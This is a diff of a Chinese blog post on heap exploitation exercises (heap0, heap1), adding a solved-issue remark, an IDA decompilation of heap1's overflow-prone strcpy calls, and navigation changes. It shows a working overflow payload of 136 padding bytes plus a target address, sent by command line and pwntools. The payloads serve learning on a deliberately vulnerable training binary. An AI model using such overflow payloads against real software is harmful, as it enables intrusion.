@@ -72,7 +72,7 @@
 
     
         <meta property="article:published_time" content="7月 18, 2018" />
-        <meta property="article:modified_time" content="7月 19, 2018" />
+        <meta property="article:modified_time" content="7月 23, 2018" />
     
 
     <!-- The Twitter Card protocol -->
@@ -113,7 +113,7 @@
     "headline": "heap-学习",
     "url": "http://iosmosis.github.io/2018/07/18/heap-学习/index.html",
     "datePublished": "7月 18, 2018",
-    "dateModified": "7月 19, 2018",
+    "dateModified": "7月 23, 2018",
     "description": "",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -589,7 +589,7 @@ gef➤
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>heap0 `python <span class="token operator">-</span>c <span class="token string">"print 'a'*136+'\xCB\x84\x04\x08'"</span>`
 </code></pre>
-<p>这里有个小问题 用pwntools写的exp却无法利用 如果有大佬看到这篇文章 还求解答</p>
+<p>这里有个小问题 用pwntools写的exp却无法利用 如果有大佬看到这篇文章 还求解答(已解决 如果你还没反应过来可以学习下argv[1]含义…感谢-SK-师傅指点 果然还是自己太差了 这里记录并且会继续努力下去)</p>
 <p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
@@ -598,6 +598,7 @@ p <span class="token operator">=</span> process<span class="token punctuation">(
 payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span><span class="token operator">+</span><span class="token string">"\xCB\x84\x04\x08"</span>
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">//</span> 错误展示<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
 </code></pre>
 <h2 id="heap1"><a href="#heap1" class="headerlink" title="heap1"></a>heap1</h2><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
@@ -638,6 +639,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-c"><code class="language-c">gcc <span class="token operator">-</span>m32 <span class="token operator">-</span>fno<span class="token operator">-</span>stack<span class="token operator">-</span>protector <span class="token operator">-</span>o heap1 heap1<span class="token punctuation">.</span>c
 </code></pre>
+<p>从源代码中可以看到,internet已经分配了两个结构，每个结构包含一个name单独分配的指针。这意味着 internet 在堆分配的struct将包含志强</p>
 <p>检查保护</p>
 <p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
 <pre class=" language-bash"><code class="language-bash">ubuntu@ubuntu:~/heap$ checksec heap1
@@ -650,6 +652,28 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 </code></pre>
 <p>只开启nx</p>
 <p>我们通过ida来分析</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  _DWORD <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1C_4</span>
+  _DWORD <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
+  _DWORD <span class="token operator">*</span>v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_4</span>
+
+  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v4 <span class="token operator">=</span> v3<span class="token punctuation">;</span>
+  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v6 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+  <span class="token operator">*</span>v5 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
+  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
 
     
 
@@ -682,6 +706,14 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <div class="section-spacer"></div>
 
     <!-- Next Nav -->
+    
+        <a href="/2018/07/23/西电线下赛PWN-writeup/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
     
 </nav>
 
@@ -767,7 +799,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
             </a>
             <ul class="dropdown-menu">
             <li>
-                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+                <a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
             </ul>
         </li>
         
